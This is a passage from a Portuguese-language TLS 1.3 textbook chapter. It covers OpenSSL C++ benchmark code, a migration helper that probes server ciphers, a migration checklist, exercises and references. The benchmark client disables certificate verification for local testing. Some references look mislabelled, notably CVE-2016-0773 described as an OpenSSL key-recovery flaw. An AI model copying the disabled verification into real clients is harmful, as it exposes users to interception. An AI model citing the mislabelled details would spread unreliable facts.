            server_thread.join();

            auto end = std::chrono::high_resolution_clock::now();
            double latency = std::chrono::duration<double, std::micro>(
                end - start).count();
            latencies.push_back(latency);

            // Cleanup
            SSL_free(client_ssl);
            SSL_free(server_ssl);
            close(sv[0]);
            close(sv[1]);
        }

        auto end_total = std::chrono::high_resolution_clock::now();
        double total_time = std::chrono::duration<double>(
            end_total - start_total).count();

        // Calcular estatísticas
        std::sort(latencies.begin(), latencies.end());

        BenchmarkResult result;
        result.handshakes_per_second = config_.num_handshakes / total_time;
        result.avg_latency_ms = std::accumulate(latencies.begin(), latencies.end(), 0.0) /
                                 latencies.size() / 1000.0;
        result.p50_latency_ms = latencies[latencies.size() * 50 / 100] / 1000.0;
        result.p95_latency_ms = latencies[latencies.size() * 95 / 100] / 1000.0;
        result.p99_latency_ms = latencies[latencies.size() * 99 / 100] / 1000.0;

        // Cleanup
        SSL_CTX_free(server_ctx);
        SSL_CTX_free(client_ctx);

        return result;
    }

    void print_results(const BenchmarkResult& result) {
        std::cout << "\n=== Resultados do Benchmark TLS 1.3 ===\n";
        std::cout << std::fixed << std::setprecision(2);

        std::cout << "Handshakes por segundo: " << result.handshakes_per_second << "\n";
        std::cout << "Latência média: " << result.avg_latency_ms << " ms\n";
        std::cout << "Latência P50: " << result.p50_latency_ms << " ms\n";
        std::cout << "Latência P95: " << result.p95_latency_ms << " ms\n";
        std::cout << "Latência P99: " << result.p99_latency_ms << " ms\n";

        std::cout << "\n=== Comparação ===\n";
        std::cout << "TLS 1.3 vs TLS 1.2:\n";
        std::cout << "  - 1 RTT a menos no handshake\n";
        std::cout << "  - 0-RTT para reconexões\n";
        std::cout << "  - Handshake simplificado\n";
        std::cout << "=========================================\n";
    }

private:
    BenchmarkConfig config_;

    SSL_CTX* create_server_context() {
        SSL_CTX* ctx = SSL_CTX_new(TLS_server_method());
        if (!ctx) return nullptr;

        SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
        SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);

        const char* ciphersuites =
            "TLS_AES_256_GCM_SHA384:"
            "TLS_CHACHA20_POLY1305_SHA256:"
            "TLS_AES_128_GCM_SHA256";

        SSL_CTX_set_ciphersuites(ctx, ciphersuites);

        if (config_.enable_session_reuse) {
            SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_SERVER);
            SSL_CTX_sess_set_cache_size(ctx, 1000);
        }

        // Gerar certificado auto-assinado para teste
        generate_test_certificate(ctx);

        return ctx;
    }

    SSL_CTX* create_client_context() {
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) return nullptr;

        SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
        SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);

        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);

        return ctx;
    }

    void generate_test_certificate(SSL_CTX* ctx) {
        // Gerar chave RSA para teste
        EVP_PKEY* pkey = EVP_PKEY_new();
        RSA* rsa = RSA_new();
        BIGNUM* bn = BN_new();
        BN_set_word(bn, RSA_F4);
        RSA_generate_key_ex(rsa, 2048, bn, nullptr);
        EVP_PKEY_assign_RSA(pkey, rsa);
        BN_free(bn);

        // Criar certificado auto-assinado
        X509* x509 = X509_new();
        ASN1_INTEGER_set(X509_get_serialNumber(x509), 1);
        X509_gmtime_adj(X509_get_notBefore(x509), 0);
        X509_gmtime_adj(X509_get_notAfter(x509), 365 * 24 * 60 * 60);
        X509_set_pubkey(x509, pkey);

        X509_NAME* name = X509_get_subject_name(x509);
        X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC,
                                    (unsigned char*)"localhost", -1, -1, 0);
        X509_NAME_add_entry_by_txt(name, "O", MBSTRING_ASC,
                                    (unsigned char*)"Test", -1, -1, 0);

        X509_set_issuer_name(x509, name);
        X509_sign(x509, pkey, EVP_sha256());

        SSL_CTX_use_certificate(ctx, x509);
        SSL_CTX_use_PrivateKey(ctx, pkey);

        X509_free(x509);
        EVP_PKEY_free(pkey);
    }
};
```

---

## 17. Migration from TLS 1.2 to TLS 1.3

### 17.1 Estratégia de Migração

```c++
// migration_helper.cpp - Assistente de migração TLS 1.2 para 1.3
// Compilar: g++ -std=c++17 -o migration_helper migration_helper.cpp -lssl -lcrypto

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509v3.h>

#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <functional>

class TlsMigrationHelper {
public:
    struct MigrationPlan {
        bool tls13_supported;
        bool backward_compatible;
        std::vector<std::string> recommended_actions;
        std::vector<std::string> warnings;
    };

    // Analisar configuração atual
    MigrationPlan analyze_current_config(const std::string& host, int port) {
        MigrationPlan plan;

        std::cout << "Analisando configuração TLS de " << host << ":" << port << "\n\n";

        // Testar TLS 1.3
        plan.tls13_supported = test_tls13_support(host, port);

        // Testar TLS 1.2
        bool tls12_supported = test_tls12_support(host, port);

        // Testar cifras
        auto cipher_results = test_cipher_suites(host, port);

        // Gerar plano
        if (plan.tls13_supported) {
            plan.recommended_actions.push_back("TLS 1.3 já suportado");
        } else {
            plan.recommended_actions.push_back("Habilitar TLS 1.3");
            plan.recommended_actions.push_back("  - OpenSSL 1.1.1+ necessário");
            plan.recommended_actions.push_back("  - Configurar SSL_CTX_set_min_proto_version");
        }

        if (tls12_supported) {
            plan.backward_compatible = true;
            plan.recommended_actions.push_back("Manter TLS 1.2 para compatibilidade");
            plan.recommended_actions.push_back("  - Mínimo TLS 1.2 com cifras fortes");
        }

        // Verificar cifras fracas
        for (const auto& [cipher, supported] : cipher_results) {
            if (is_weak_cipher(cipher) && supported) {
                plan.warnings.push_back("Cifra fraca habilitada: " + cipher);
                plan.recommended_actions.push_back("Desabilitar: " + cipher);
            }
        }

        // Recomendações gerais
        plan.recommended_actions.push_back("\nRecomendações:");
        plan.recommended_actions.push_back("1. Configurar TLS 1.3 como preferido");
        plan.recommended_actions.push_back("2. Manter TLS 1.2 com ECDHE apenas");
        plan.recommended_actions.push_back("3. Desabilitar cifras fracas");
        plan.recommended_actions.push_back("4. Testar em staging antes de produção");
        plan.recommended_actions.push_back("5. Monitorar métricas após migração");

        return plan;
    }

    // Gerar configuração migrada
    std::string generate_migrated_config() {
        return R"(
// Configuração OpenSSL para TLS 1.3 (migrada de TLS 1.2)

SSL_CTX* create_migrated_context() {
    SSL_CTX* ctx = SSL_CTX_new(TLS_method());

    // TLS 1.3 como versão preferida
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);

    // Cifras TLS 1.3
    const char* ciphersuites =
        "TLS_AES_256_GCM_SHA384:"
        "TLS_CHACHA20_POLY1305_SHA256:"
        "TLS_AES_128_GCM_SHA256";

    SSL_CTX_set_ciphersuites(ctx, ciphersuites);

    // Cifras TLS 1.2 (compatibilidade)
    const char* cipher_list =
        "ECDHE-ECDSA-AES256-GCM-SHA384:"
        "ECDHE-RSA-AES256-GCM-SHA384:"
        "ECDHE-ECDSA-CHACHA20-POLY1305:"
        "ECDHE-RSA-CHACHA20-POLY1305:"
        "ECDHE-ECDSA-AES128-GCM-SHA256:"
        "ECDHE-RSA-AES128-GCM-SHA256";

    SSL_CTX_set_cipher_list(ctx, cipher_list);

    // Grupos de curvas (TLS 1.3)
    SSL_CTX_set1_groups_list(ctx, "X25519:P-256:P-384:P-521");

    return ctx;
}
        )";
    }

private:
    bool test_tls13_support(const std::string& host, int port) {
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
        SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);

        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        bool supported = false;
        if (BIO_do_connect(bio) > 0) {
            SSL_set_bio(ssl, bio, bio);
            if (SSL_connect(ssl) == 1) {
                supported = (SSL_version(ssl) == TLS1_3_VERSION);
            }
        }

        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return supported;
    }

    bool test_tls12_support(const std::string& host, int port) {
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
        SSL_CTX_set_max_proto_version(ctx, TLS1_2_VERSION);

        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        bool supported = false;
        if (BIO_do_connect(bio) > 0) {
            SSL_set_bio(ssl, bio, bio);
            if (SSL_connect(ssl) == 1) {
                supported = (SSL_version(ssl) == TLS1_2_VERSION);
            }
        }

        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return supported;
    }

    std::map<std::string, bool> test_cipher_suites(const std::string& host, int port) {
        std::map<std::string, bool> results;

        const char* ciphers[] = {
            "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-RSA-CHACHA20-POLY1305",
            "DHE-RSA-AES256-SHA256",
            "RSA-AES256-SHA256",
            "RC4-SHA",
            "DES-CBC3-SHA"
        };

        for (const char* cipher : ciphers) {
            SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
            SSL_CTX_set_cipher_list(ctx, cipher);

            SSL* ssl = SSL_new(ctx);
            BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

            bool supported = false;
            if (BIO_do_connect(bio) > 0) {
                SSL_set_bio(ssl, bio, bio);
                if (SSL_connect(ssl) == 1) {
                    supported = true;
                }
            }

            results[cipher] = supported;

            SSL_free(ssl);
            SSL_CTX_free(ctx);
        }

        return results;
    }

    bool is_weak_cipher(const std::string& cipher) {
        return cipher.find("RC4") != std::string::npos ||
               cipher.find("DES") != std::string::npos ||
               cipher.find("NULL") != std::string::npos ||
               cipher.find("EXPORT") != std::string::npos ||
               cipher.find("MD5") != std::string::npos;
    }
};
```

### 17.2 Checklist de Migração

```markdown
# Checklist de Migração TLS 1.2 → TLS 1.3

## Pré-requisitos
- [ ] OpenSSL 1.1.1+ instalado (suporte a TLS 1.3)
- [ ] Compilador com suporte a C++17
- [ ] Certificados atualizados (RSA 2048+ ou ECDSA P-256+)
- [ ] Testes automatizados de TLS configurados

## Configuração do Servidor
- [ ] TLS 1.3 habilitado como versão preferida
- [ ] TLS 1.2 mantido para compatibilidade (se necessário)
- [ ] Cifras fracas desabilitadas (RC4, DES, 3DES, NULL, EXPORT)
- [ ] Apenas ECDHE para forward secrecy
- [ ] Grupos de curvas configurados (X25519, P-256, P-384, P-521)
- [ ] ALPN configurado (HTTP/2 recomendado)
- [ ] OCSP Stapling habilitado

## Configuração do Cliente
- [ ] TLS 1.3 suportado
- [ ] Verificação de certificado habilitada
- [ ] Hostname verification habilitada
- [ ] Fallback para TLS 1.2 (se necessário)

## Segurança
- [ ] 0-RTT desabilitado (ou com proteção contra replay)
- [ ] Session tickets com rotação adequada
- [ ] Chaves privadas armazenadas com segurança
- [ ] Certificados com validade adequada

## Testes
- [ ] testssl.sh: nenhum HIGH/CRITICAL vulnerability
- [ ] sslyze: configuração otimizada
- [ ] Handshake funciona em todos os clientes suportados
- [ ] Performance aceitável (latência, throughput)

## Monitoramento
- [ ] Métricas de handshake coletadas
- [ ] Alertas para falhas TLS
- [ ] Logs de conexões TLS habilitados
- [ ] Relatórios de compliance configurados
```

---

## 18. Exercícios

### Exercício 1: Implementação Básica de HKDF

Implemente o HKDF (HMAC-based Key Derivation Function) conforme RFC 5869. Implemente as funções `hkdf_extract` e `hkdf_expand` usando OpenSSL.

**Requisitos:**
- Suporte a SHA-256 e SHA-384
- Validação de entrada
- Testes unitários

### Exercício 2: Servidor TLS 1.3 com SNI

Estenda o servidor TLS 1.3 implementado neste capítulo para suportar múltiplos certificados baseados no SNI (Server Name Indication).

**Requisitos:**
- Suporte a múltiplos hostnames
- Certificados diferentes por hostname
- Cache de sessões por hostname

### Exercício 3: Cliente com 0-RTT

Implemente um cliente TLS 1.3 que suporte 0-RTT Early Data. Implemente proteção contra replay para requisições POST.

**Requisitos:**
- Suporte a 0-RTT
- Verificação de idempotência
- Fallback para 1-RTT se 0-RTT falhar

### Exercício 4: Análise de CVEs

Implemente verificações automatizadas para as CVEs discutidas neste capítulo:
- Heartbleed (CVE-2014-0160)
- OpenSSL Key Recovery (CVE-2016-0773)
- Raccoon Attack (CVE-2020-1968)
- ROBOT Attack

**Requisitos:**
- Verificação passiva (não intrusiva)
- Relatório de vulnerabilidades
- Recomendações de correção

### Exercício 5: Benchmark Comparativo

Implemente um benchmark que compare a performance de:
- TLS 1.2 vs TLS 1.3
- AES-256-GCM vs ChaCha20-Poly1305
- Com e sem session reuse
- Com e sem 0-RTT

**Requisitos:**
- Handshakes por segundo
- Latência (P50, P95, P99)
- Uso de memória
- Gráficos de resultados

### Exercício 6: Migração Automática

Implemente uma ferramenta que analise a configuração TLS atual de um servidor e gere um plano de migração para TLS 1.3.

**Requisitos:**
- Detecção de versões TLS suportadas
- Análise de cifras habilitadas
- Identificação de vulnerabilidades
- Plano de migração passo a passo

---

## 19. Referências

### RFCs
1. RFC 8446 - The Transport Layer Security (TLS) Protocol Version 1.3
2. RFC 5869 - HMAC-based Extract-and-Expand Key Derivation Function (HKDF)
3. RFC 6520 - Transport Layer Security (TLS) and Datagram Transport Layer Security (DTLS) Heartbeat Extension
4. RFC 7301 - Transport Layer Security (TLS) Application-Layer Protocol Negotiation Extension
5. RFC 8447 - IANA Registry Updates for TLS and DTLS
6. RFC 8996 - Deprecating TLS 1.0 and TLS 1.1

### CVEs
7. CVE-2014-0160 - OpenSSL Heartbleed
8. CVE-2016-0773 - OpenSSL Key Recovery
9. CVE-2020-1968 - Raccoon Attack
10. CVE-2017-13099 - ROBOT Attack

### Documentação OpenSSL
11. OpenSSL 3.0 Documentation - https://www.openssl.org/docs/
12. OpenSSL Migration Guide - https://www.openssl.org/docs/migration_guide.html
13. OpenSSL TLS 1.3 - https://www.openssl.org/docs/man3.0/man7/migration_guide.html

### Artigos e Papers
14. "The Transport Layer Security (TLS) Protocol Version 1.3" - Resumo executivo do RFC 8446
15. "Raccoon Attack: Timing Side-Channel against DH Key Exchange" - Usenix Security 2020
16. "ROBOT: Return Of Bleichenbacher's Oracle Threat" - Usenix Security 2018
17. "Logjam: Diffie-Hellman, discrete log, and the weakness of TLS" - 2015

### Ferramentas
18. testssl.sh - https://github.com/drwetter/testssl.sh
19. sslyze - https://github.com/nabla-c0d3/sslyze
20. nmap ssl-enum-ciphers - https://nmap.org

### Livros
21. "Bulletproof TLS and PKI" - Ivan Ristic
22. "Engineering Security" - Peter Gutmann
23. "Cryptography Engineering" - Ferguson, Schneier, Kohno

---

## Resumo do Capítulo

Neste capítulo, exploramos os internals do TLS 1.3 em profundidade:

1. **Evolução do TLS**: Desde SSL 2.0 até TLS 1.3, entendendo as melhorias de segurança e performance
2. **Handshake TLS 1.3**: Fluxo de mensagens simplificado com 1-RTT
3. **Key Schedule**: Derivação de chaves usando HKDF
4. **0-RTT**: Early data com trade-offs de segurança
5. **Cipher Suites**: AES-256-GCM e ChaCha20-Poly1305
6. **Certificate Verification**: Cadeia de confiança e OCSP
7. **SNI e ECH**: Indicação de nome do servidor e Client Hello criptografado
8. **OpenSSL 3.x**: Configuração completa para servidores e clientes
9. **Implementações C++17**: Servidor e cliente TLS completos
10. **CVEs**: Heartbleed, OpenSSL key recovery, Raccoon Attack, ROBOT Attack
11. **Testing**: testssl.sh e sslyze
12. **Performance**: Benchmarks e otimizações
13. **Migration**: Estratégia para migrar de TLS 1.2 para 1.3

TLS 1.3 representa o estado da arte em segurança de transport layer. Sua adoção é essencial para proteger comunicações na internet moderna.
